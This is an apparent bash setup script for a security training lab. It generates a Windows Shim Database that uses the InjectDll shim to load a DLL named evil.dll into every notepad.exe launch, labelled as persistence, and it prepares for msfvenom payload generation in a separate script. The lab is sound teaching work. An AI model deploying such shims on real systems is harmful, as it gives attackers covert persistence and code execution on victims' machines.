#!/bin/bash
# =============================================================================
#  ubuntu_setup.sh  —  SdbExplorer Lab  |  One-time setup
# =============================================================================
#  Run this ONCE before handing the lab to users.
#  It creates the lab directory, generates patch.sdb, and places
#  sdb-explorer.exe so the Python web server (Phase 2) can serve all three
#  files to the Windows VM.
#
#  What this script does NOT do:
#    - Generate evil.dll (IP-dependent; handled by lab_start.sh each session)
#    - Configure the Windows VM (handled separately by the Windows setup script)
#
#  After this script succeeds, ~/BnB/SdbExplorer will contain:
#    patch.sdb          Windows Shim Database — InjectDll targeting notepad.exe
#    sdb-explorer.exe   Forensic SDB parser (Windows executable)
#    [evil.dll]         Generated at lab start, not here
# =============================================================================

set -euo pipefail

# ─── Colours ──────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

info()    { echo -e "${CYAN}[*]${NC} $*"; }
success() { echo -e "${GREEN}[+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
error()   { echo -e "${RED}[ERROR]${NC} $*" >&2; }
die()     { error "$*"; exit 1; }

# ─── Configuration ────────────────────────────────────────────────────────────
LAB_DIR="$HOME/BnB/SdbExplorer"

# Path where evil.dll will land on the WINDOWS VM (baked into patch.sdb).
# Change this only if your Windows lab uses a different layout.
WIN_DLL_PATH='C:\Users\Public\evil.dll'

# SDB targets this executable — do not change unless redesigning the lab.
TARGET_EXE='notepad.exe'

# ─── sdb-explorer.exe ─────────────────────────────────────────────────────────
# Option A  (recommended): set this to the direct download URL for the
#           pre-compiled sdb-explorer.exe from your lab repository or a
#           trusted release (e.g. GitHub releases page of evil-e/sdb-explorer).
#           Leave empty to use Option B instead.
SDB_EXPLORER_URL=""

# Option B  (manual): if no URL is set above, place sdb-explorer.exe in the
#           same directory as this script before running it.
#           The script will pick it up automatically.

# =============================================================================
#  STEP 0 — Preflight checks
# =============================================================================
echo ""
echo -e "${BOLD}════════════════════════════════════════════${NC}"
echo -e "${BOLD}   SdbExplorer Lab — Ubuntu Setup Script    ${NC}"
echo -e "${BOLD}════════════════════════════════════════════${NC}"
echo ""

info "Checking prerequisites..."

# Python 3 (for SDB generation and later for the web server)
if ! command -v python3 &>/dev/null; then
    die "python3 is not installed. Run: sudo apt-get install -y python3"
fi
success "python3 found: $(python3 --version)"

# msfvenom — not needed here, but warn early if missing so the user
# knows before lab_start.sh fails later.
if command -v msfvenom &>/dev/null; then
    success "msfvenom found (needed by lab_start.sh)"
else
    warn "msfvenom not found. Install Metasploit Framework before running lab_start.sh."
    warn "  sudo apt-get install -y metasploit-framework"
fi

# wget (used for optional sdb-explorer download)
if ! command -v wget &>/dev/null; then
    warn "wget not found; installing..."
    sudo apt-get install -y wget
fi

# =============================================================================
#  STEP 1 — Create lab directory
# =============================================================================
echo ""
info "Creating lab directory: $LAB_DIR"
mkdir -p "$LAB_DIR"
success "Directory ready"

# =============================================================================
#  STEP 2 — Generate patch.sdb
# =============================================================================
echo ""
info "Generating patch.sdb..."
info "  Target executable : $TARGET_EXE"
info "  DLL to inject     : $WIN_DLL_PATH"
echo ""

# The Python script below creates a minimal Windows Shim Database (SDB) file
# that instructs the Application Compatibility Engine to apply the built-in
# InjectDll fix to every launch of TARGET_EXE.
#
# ─── FORMAT NOTES ─────────────────────────────────────────────────────────────
# Each tag is a 2-byte little-endian word:
#   Bits [15:12]  data type nibble
#   Bits [11:0]   tag ID
#
# Type nibbles used here:
#   0x7  LIST    → 4-byte content-length followed by nested tags
#   0x8  STRING  → 4-byte byte-length followed by UTF-16LE characters
#
# Relevant tag IDs:
#   LIST  0x001 DATABASE   root container
#   LIST  0x002 LIBRARY    shim-definition section (empty → built-in shim)
#   LIST  0x007 EXE        executable-matching entry
#   LIST  0x00E SHIM_REF   shim reference inside an EXE entry
#   STR   0x001 NAME       name of the shim / exe / ref
#   STR   0x004 APP_NAME   friendly label for the EXE entry
#   STR   0x006 MODULE     DLL path passed to InjectDll
#
# ─── TESTING NOTE ─────────────────────────────────────────────────────────────
# The SDB binary format has limited public documentation. This generator
# implements the format to the best of current knowledge. ALWAYS test the
# generated patch.sdb on a real Windows VM with sdbinst.exe before deploying.
# If sdbinst.exe rejects the file, the recommended fallback is to create
# patch.sdb once using the Windows ADK Compatibility Administrator GUI tool,
# commit the resulting binary to your lab repository, and replace this
# generation step with a simple file copy.

python3 - << PYTHON_EOF
import struct, sys, os

# ── Tag builders ──────────────────────────────────────────────────────────────

def _mk_tag(type_nibble, tag_id):
    return struct.pack('<H', (type_nibble << 12) | tag_id)

def str_tag(tag_id, value):
    """Inline UTF-16LE string tag (type 0x8)."""
    enc = value.encode('utf-16-le')
    return _mk_tag(0x8, tag_id) + struct.pack('<I', len(enc)) + enc

def list_tag(tag_id, *children):
    """LIST container tag (type 0x7) wrapping any number of child byte sequences."""
    body = b''.join(children)
    return _mk_tag(0x7, tag_id) + struct.pack('<I', len(body)) + body

# ── Tag ID constants ──────────────────────────────────────────────────────────
# LIST tags (0x7xxx)
DATABASE  = 0x001
LIBRARY   = 0x002
EXE       = 0x007
SHIM_REF  = 0x00E

# STRING tags (0x8xxx)
NAME      = 0x001   # Name of shim or EXE entry
APP_NAME  = 0x004   # Friendly application name
MODULE    = 0x006   # DLL path for InjectDll

# ── Build SDB ────────────────────────────────────────────────────────────────
dll_path   = r'${WIN_DLL_PATH}'
target_exe = '${TARGET_EXE}'
out_path   = os.path.join(os.path.expanduser('~'), 'BnB', 'SdbExplorer', 'patch.sdb')

# SHIM_REF: references the built-in InjectDll shim and supplies the DLL path.
shim_ref_block = list_tag(
    SHIM_REF,
    str_tag(NAME,   'InjectDll'),   # Must match the built-in shim name exactly
    str_tag(MODULE, dll_path),       # DLL the shim engine will load
)

# EXE entry: matches the target process by name and applies the shim.
exe_block = list_tag(
    EXE,
    str_tag(NAME,     target_exe),
    str_tag(APP_NAME, 'LabPersistence'),
    shim_ref_block,
)

# LIBRARY: empty — InjectDll is a built-in shim; no custom definition needed.
library_block = list_tag(LIBRARY)

# DATABASE: root container.
database_block = list_tag(DATABASE, library_block, exe_block)

with open(out_path, 'wb') as fh:
    fh.write(database_block)

size = os.path.getsize(out_path)
print(f'[+] patch.sdb written  →  {out_path}  ({size} bytes)')
print(f'    Target exe : {target_exe}')
print(f'    InjectDll  : {dll_path}')
PYTHON_EOF

success "patch.sdb generated at $LAB_DIR/patch.sdb"
echo ""
warn "IMPORTANT: Verify patch.sdb on a Windows test VM before deploying:"
warn "  sdbinst.exe patch.sdb"
warn "  If sdbinst rejects the file, use Compatibility Administrator (ADK)"
warn "  to regenerate it manually — see comments in this script for details."

# =============================================================================
#  STEP 3 — Place sdb-explorer.exe
# =============================================================================
echo ""
info "Setting up sdb-explorer.exe..."

SDB_EXPLORER_DEST="$LAB_DIR/sdb-explorer.exe"

if [[ -n "$SDB_EXPLORER_URL" ]]; then
    # Option A: download from URL
    info "Downloading from $SDB_EXPLORER_URL ..."
    wget -q --show-progress -O "$SDB_EXPLORER_DEST" "$SDB_EXPLORER_URL"
    success "sdb-explorer.exe downloaded"

elif [[ -f "$(dirname "$0")/sdb-explorer.exe" ]]; then
    # Option B: copy from the same directory as this script
    cp "$(dirname "$0")/sdb-explorer.exe" "$SDB_EXPLORER_DEST"
    success "sdb-explorer.exe copied from script directory"

elif [[ -f "$SDB_EXPLORER_DEST" ]]; then
    # Already in place from a previous run
    success "sdb-explorer.exe already present — skipping"

else
    warn "sdb-explorer.exe not found. Do one of the following:"
    warn "  A) Set SDB_EXPLORER_URL at the top of this script, OR"
    warn "  B) Place sdb-explorer.exe in the same folder as ubuntu_setup.sh"
    warn "     and re-run the script."
    warn ""
    warn "  Suggested source: https://github.com/evil-e/sdb-explorer/releases"
    warn ""
    warn "Continuing without sdb-explorer.exe — lab WILL NOT work until added."
fi

# =============================================================================
#  STEP 4 — Verify lab directory
# =============================================================================
echo ""
info "Lab directory contents:"
echo ""
ls -lh "$LAB_DIR" 2>/dev/null || true
echo ""

# ── Check each required file ──────────────────────────────────────────────────
ALL_OK=true
for f in patch.sdb sdb-explorer.exe; do
    if [[ -f "$LAB_DIR/$f" ]]; then
        success "$f  ✓"
    else
        warn    "$f  ✗  MISSING"
        ALL_OK=false
    fi
done

# evil.dll is absent by design at this stage
info "evil.dll  —  (generated per-session by lab_start.sh)"

echo ""
if [[ "$ALL_OK" == true ]]; then
    echo -e "${GREEN}${BOLD}Setup complete.${NC}"
    echo ""
    echo -e "Next steps:"
    echo -e "  1. Test patch.sdb on a Windows VM (see warning above)."
    echo -e "  2. Verify sdb-explorer.exe parses an SDB file correctly on Windows."
    echo -e "  3. At the start of each lab session, run:  ${BOLD}./lab_start.sh${NC}"
else
    echo -e "${YELLOW}${BOLD}Setup finished with warnings — resolve missing files before using this lab.${NC}"
fi
echo ""
